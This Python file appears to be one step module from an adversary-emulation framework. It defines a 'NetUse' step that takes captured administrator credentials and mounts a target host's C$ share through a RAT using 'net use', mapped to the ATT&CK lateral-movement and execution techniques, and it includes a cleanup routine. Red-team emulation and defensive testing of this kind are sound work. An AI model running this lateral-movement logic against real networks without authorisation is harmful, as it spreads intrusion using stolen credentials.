from plugins.adversary.app.commands import net
from plugins.adversary.app.operation.operation import Step, OPUser, OPDomain, OPCredential, OPHost, OPRat, OPVar, OPShare


class NetUse(Step):
    """
    Description:
        This step mounts a C$ network share on a target remote machine using net use. This can then be leveraged
        for a host of machine-to-machine techniques.
    Requirements:
        Requires administrative credentials for target machine ((needs both administrator enumeration 'GetAdmin',
        and credential data 'Credentials') and domain enumeration.
    """
    attack_mapping = [('T1077', 'Lateral Movement'), ('T1106', 'Execution')]
    display_name = "net_use"
    summary = "Mount a C$ network share using net use"

    # prevents net_use
    value = 0
    preconditions = [("rat", OPRat),
                     ('host', OPHost),
                     ("cred", OPCredential({'$in': {'user': OPVar("host.admins")}})),
                     ('user', OPUser(OPVar("cred.user"))),
                     ('domain', OPDomain(OPVar("user.domain")))]

    #    These post-conditions create a weird behavior where the planner with think it has paths ahead due to Remove
    #    Net Share being an option.  Will not break
    #    postconditions = [('share_g', OPShare({"src_host": OPVar("rat.host"), "dest_host": OPVar("host"),
    #                                           'share_name': 'C$', 'share_removed': False}))]
    postconditions = [('share_g', OPShare({"src_host": OPVar("rat.host"), "dest_host": OPVar("host"),
                                           'share_name': 'C$'}))]

    not_equal = [('host', 'rat.host')]

    preproperties = ['domain.windows_domain', 'cred.password', 'host.fqdn', 'user.username']
    postproperties = ["share_g.share_path", "share_g.mount_point", "share_g.share_removed"]

    deterministic = True

    cddl = """
    Knowns:
        rat: OPRat[host]
        host: OPHost[fqdn]
        cred: OPCredential[password, user[username, domain[windows_domain]]]
    Where:
        rat.host != host
    Effects:
        if not exist rat {
            forget rat
        } elif cred.user in host.admins {
            create OPShare[src_host=rat.host, dest_host=host, share_name="C$", share_path="whatever", \
                           share_removed="False"]
        }
    """

    @staticmethod
    def description(rat, host):
        return "Mounting {}'s C$ network share on {} with net use".format(host.fqdn, rat.host.fqdn)

    @staticmethod
    async def action(operation, rat, host, cred, user, domain, share_g):
        await operation.execute_shell_command(rat, *net.use(host.fqdn, 'C$', user=user.username,
                                                            user_domain=domain.windows_domain, password=cred.password))
        await share_g({'share_path': '\\\\{}\\C$'.format(host.fqdn), 'mount_point': 'C:', 'share_removed': False})
        return True

    @staticmethod
    async def cleanup(cleaner, share_g):
        for share in share_g:
            if not share.share_removed:
                await cleaner.delete(share)
